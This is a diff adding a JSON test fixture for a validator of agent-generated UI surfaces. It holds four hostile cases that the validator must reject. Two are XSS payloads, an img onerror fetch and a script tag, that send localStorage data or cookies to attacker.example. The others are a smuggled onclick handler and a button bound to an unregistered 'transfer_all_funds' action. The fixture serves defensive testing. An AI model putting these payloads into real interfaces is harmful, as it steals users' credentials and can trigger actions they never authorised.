@@ -1,0 +1,61 @@
+{
+  "description": "Four surfaces a hostile agent, tool, or fetched page might emit. Each breaks one invariant. The validator names and rejects the offending component while the safe part still renders.",
+  "cases": [
+    {
+      "name": "raw-html-type",
+      "note": "A component type that would carry executable markup. There is no such type in the catalog.",
+      "surface": {
+        "root": "root",
+        "components": [
+          {"id": "root", "type": "Column", "children": ["ok", "evil"]},
+          {"id": "ok", "type": "Text", "variant": "heading", "text": {"$bind": "/title"}},
+          {"id": "evil", "type": "RawHtml", "html": "<img src=x onerror=\"fetch('https://attacker.example/e?m='+localStorage.memoryHandle)\">"}
+        ],
+        "dataModel": {"title": "Dashboard"}
+      },
+      "expect_invariant": "catalog"
+    },
+    {
+      "name": "smuggled-handler",
+      "note": "A known component with an extra onclick property naming a script.",
+      "surface": {
+        "root": "root",
+        "components": [
+          {"id": "root", "type": "Column", "children": ["ok", "evil"]},
+          {"id": "ok", "type": "Text", "variant": "heading", "text": {"$bind": "/title"}},
+          {"id": "evil", "type": "Button", "label": "Export", "onPress": {"action": "rerun"}, "onclick": "steal()"}
+        ],
+        "dataModel": {"title": "Dashboard"}
+      },
+      "expect_invariant": "data-not-code"
+    },
+    {
+      "name": "markup-in-binding",
+      "note": "A bound value that is itself markup, hoping the client sets innerHTML.",
+      "surface": {
+        "root": "root",
+        "components": [
+          {"id": "root", "type": "Column", "children": ["ok", "evil"]},
+          {"id": "ok", "type": "Text", "variant": "heading", "text": {"$bind": "/title"}},
+          {"id": "evil", "type": "Text", "text": "<script>document.location='https://attacker.example/'+document.cookie</script>"}
+        ],
+        "dataModel": {"title": "Dashboard"}
+      },
+      "expect_invariant": "data-not-code"
+    },
+    {
+      "name": "unregistered-action",
+      "note": "A button whose action name was never registered by the agent.",
+      "surface": {
+        "root": "root",
+        "components": [
+          {"id": "root", "type": "Column", "children": ["ok", "evil"]},
+          {"id": "ok", "type": "Text", "variant": "heading", "text": {"$bind": "/title"}},
+          {"id": "evil", "type": "Button", "label": "Wire funds", "onPress": {"action": "transfer_all_funds"}}
+        ],
+        "dataModel": {"title": "Dashboard"}
+      },
+      "expect_invariant": "event"
+    }
+  ]
+}
